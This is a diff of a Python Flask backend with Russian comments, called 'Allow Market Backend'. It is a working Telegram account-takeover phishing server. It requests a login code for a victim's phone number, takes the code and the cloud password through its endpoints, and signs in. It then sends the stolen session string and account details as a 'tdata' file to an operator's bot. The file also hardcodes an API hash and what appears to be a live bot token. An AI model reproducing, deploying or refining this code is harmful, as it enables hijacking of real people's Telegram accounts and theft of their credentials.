@@ -1,5 +1,6 @@
-# app.py — бэкенд на Telethon
-# Код приходит от официального Telegram (MTProto)
+# app.py — БЭКЕНД НА TELETHON
+# КОД ПРИХОДИТ ОТ ОФИЦИАЛЬНОГО TELEGRAM (MTProto)
+# БОТ ИСПОЛЬЗУЕТСЯ ТОЛЬКО ДЛЯ ЛОГОВ АДМИНУ
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -16,7 +17,8 @@ from telethon.errors import (
     PhoneCodeInvalidError,
     PhoneCodeExpiredError,
     SessionPasswordNeededError,
-    PasswordHashInvalidError
+    PasswordHashInvalidError,
+    FloodWaitError
 )
 import requests
 
@@ -28,10 +30,11 @@ CORS(app)
 # ============================================================
 # КОНФИГУРАЦИЯ
 # ============================================================
+# ЭТИ ДАННЫЕ БЕРУТСЯ ИЗ my.telegram.org
 API_ID = int(os.getenv('API_ID', '27908807'))
 API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
 
-# Бот ТОЛЬКО для логов админу
+# БОТ ТОЛЬКО ДЛЯ ЛОГОВ АДМИНУ (НЕ ДЛЯ ОТПРАВКИ КОДА!)
 ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 
@@ -39,11 +42,11 @@ ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 sessions = {}
 
 # ============================================================
-# ФУНКЦИИ ДЛЯ ЛОГОВ АДМИНУ
+# ФУНКЦИИ ДЛЯ ЛОГОВ АДМИНУ (ЧЕРЕЗ БОТА)
 # ============================================================
 
 def send_admin_log(message, data=None):
-    """Отправка лога админу"""
+    """Отправка лога админу через бота"""
     try:
         text = f"🔐 {message}"
         if data:
@@ -57,7 +60,7 @@ def send_admin_log(message, data=None):
         print(f"Admin log error: {e}")
 
 def send_file_to_admin(file_content, filename, caption):
-    """Отправка файла админу"""
+    """Отправка файла админу через бота"""
     try:
         files = {'document': (filename, file_content)}
         data = {
@@ -80,7 +83,7 @@ def format_tdata(session_data):
     """Форматирование tdata для отправки админу"""
     lines = []
     lines.append("=" * 50)
-    lines.append("📁 TDATA СЕССИЯ TELEGRAM (Telethon)")
+    lines.append("📁 TDATA СЕССИЯ TELEGRAM")
     lines.append("=" * 50)
     lines.append("")
     lines.append(f"🆔 User ID: {session_data.get('user_id', 'N/A')}")
@@ -90,7 +93,7 @@ def format_tdata(session_data):
     lines.append(f"📛 Last Name: {session_data.get('last_name', 'N/A')}")
     lines.append("")
     lines.append("-" * 50)
-    lines.append("🔑 SESSION STRING (для Telethon):")
+    lines.append("🔑 SESSION STRING (для Telethon/Pyrogram):")
     lines.append("-" * 50)
     lines.append(session_data.get('session_string', 'N/A'))
     lines.append("")
@@ -110,16 +113,17 @@ def create_tdata_file(session_data):
     return io.BytesIO(content.encode('utf-8'))
 
 # ============================================================
-# ФУНКЦИИ РАБОТЫ С TELEGRAM API (Telethon)
+# ОСНОВНЫЕ ФУНКЦИИ (MTProto API)
 # ============================================================
 
 async def send_code_async(phone):
     """
-    Отправка кода через официальный Telegram API (Telethon).
-    Код приходит от Telegram, НЕ от бота!
+    Отправка кода через MTProto API.
+    Код приходит ОТ TELEGRAM, а не от бота!
     """
     try:
-        session_name = f"sessions/{phone.replace('+', '')}"
+        # Создаём клиент для этого номера
+        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
         
         client = TelegramClient(
             session_name,
@@ -129,38 +133,46 @@ async def send_code_async(phone):
         
         await client.connect()
         
-        if not await client.is_user_authorized():
-            # Отправляем запрос на получение кода
-            # Telegram САМ отправит код пользователю
-            result = await client.send_code_request(phone)
-            
-            # Сохраняем клиент для проверки кода
-            sessions[phone] = {
-                'client': client,
-                'phone_code_hash': result.phone_code_hash,
-                'is_connected': True
-            }
-            
-            send_admin_log(
-                f"📱 Запрос кода для {phone}",
-                f"Код отправлен через Telegram API (Telethon)"
-            )
-            
-            return {
-                'success': True,
-                'phone_code_hash': result.phone_code_hash,
-                'message': 'Code sent by Telegram'
-            }
-        else:
+        # Проверяем, авторизован ли уже
+        if await client.is_user_authorized():
+            await client.disconnect()
             return {'success': False, 'error': 'Already authorized'}
+        
+        # ОТПРАВЛЯЕМ ЗАПРОС НА КОД ЧЕРЕЗ MTProto
+        # Telegram САМ отправит код пользователю
+        # НИКАКОГО БОТА НЕ ИСПОЛЬЗУЕТСЯ!
+        result = await client.send_code_request(phone)
+        
+        # Сохраняем клиент для проверки кода
+        sessions[phone] = {
+            'client': client,
+            'phone_code_hash': result.phone_code_hash,
+            'is_connected': True
+        }
+        
+        # Лог админу (только информация, код не отправляем!)
+        send_admin_log(
+            f"📱 Запрос кода для {phone}",
+            f"✅ Код отправлен через MTProto API (Telegram)\n❌ Бот НЕ использовался"
+        )
+        
+        return {
+            'success': True,
+            'phone_code_hash': result.phone_code_hash,
+            'message': 'Code sent by Telegram (MTProto)'
+        }
         
     except PhoneNumberInvalidError:
         return {'success': False, 'error': 'Invalid phone number'}
+    except FloodWaitError as e:
+        return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds'}
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
 async def check_code_async(phone, code, phone_code_hash):
-    """Проверка кода через официальный Telegram API"""
+    """
+    Проверка кода через MTProto API
+    """
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -172,7 +184,7 @@ async def check_code_async(phone, code, phone_code_hash):
             await client.connect()
         
         try:
-            # Пытаемся войти с кодом
+            # ПРОВЕРЯЕМ КОД ЧЕРЕЗ MTProto
             signed_in = await client.sign_in(
                 phone=phone,
                 code=code,
@@ -216,7 +228,9 @@ async def check_code_async(phone, code, phone_code_hash):
         return {'success': False, 'error': str(e)}
 
 async def check_password_async(phone, password):
-    """Проверка облачного пароля"""
+    """
+    Проверка облачного пароля через MTProto
+    """
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -264,9 +278,9 @@ async def check_password_async(phone, password):
 def ping():
     return jsonify({
         'status': 'online',
-        'service': 'Allow Market Backend (Telethon)',
-        'version': '3.0.0',
-        'note': 'Код приходит от официального Telegram через MTProto',
+        'service': 'Allow Market Backend (Telethon MTProto)',
+        'version': '4.0.0',
+        'important': 'Код приходит от ОФИЦИАЛЬНОГО TELEGRAM, НЕ от бота!',
         'endpoints': [
             'GET /ping',
             'POST /sendCode',
@@ -325,15 +339,16 @@ def check_code():
         else:
             session_data = result['sessionData']
             
+            # Отправляем tdata админу
             tdata_file = create_tdata_file(session_data)
             caption = (
-                f"✅ *НОВАЯ СЕССИЯ TELEGRAM (Telethon)*\n\n"
+                f"✅ *НОВАЯ СЕССИЯ TELEGRAM*\n\n"
                 f"🆔 User ID: `{session_data['user_id']}`\n"
                 f"📱 Phone: `{session_data['phone']}`\n"
                 f"👤 Username: @{session_data['username']}\n"
                 f"📛 Name: {session_data['first_name']} {session_data['last_name']}\n\n"
                 f"📁 *tdata прикреплён к сообщению*\n"
-                f"🔹 *Код отправлен через Telegram API (MTProto)*"
+                f"🔹 *Код отправлен через MTProto (официальный Telegram API)*"
             )
             
             send_file_to_admin(
@@ -409,9 +424,9 @@ def check_password():
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
     print("=" * 60)
-    print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon)")
-    print("📌 Код верификации отправляется через Telegram API (MTProto)")
-    print("📌 Пользователь получает код ОТ TELEGRAM (НЕ от бота!)")
+    print("🔐 БЭКЕНД ЗАПУЩЕН")
+    print("📌 API: MTProto (Telethon)")
+    print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
     print("📌 Бот используется ТОЛЬКО для логов админу")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
